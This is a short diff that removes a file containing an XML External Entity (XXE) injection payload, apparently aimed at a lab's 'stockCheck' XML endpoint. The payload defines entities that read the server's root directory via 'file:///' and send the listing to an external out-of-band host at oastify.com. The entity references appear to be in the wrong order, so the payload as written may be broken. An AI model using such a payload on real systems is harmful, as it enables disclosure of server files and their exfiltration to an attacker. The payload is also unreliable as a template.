@@ -1,3 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % dir SYSTEM "file:///"> <!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'http://uzxa6ejprk2uj9m7lusugbn5cwio6gu5.oastify.com/?dir=%dir;'>"> %xxe;%eval;]>
-<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
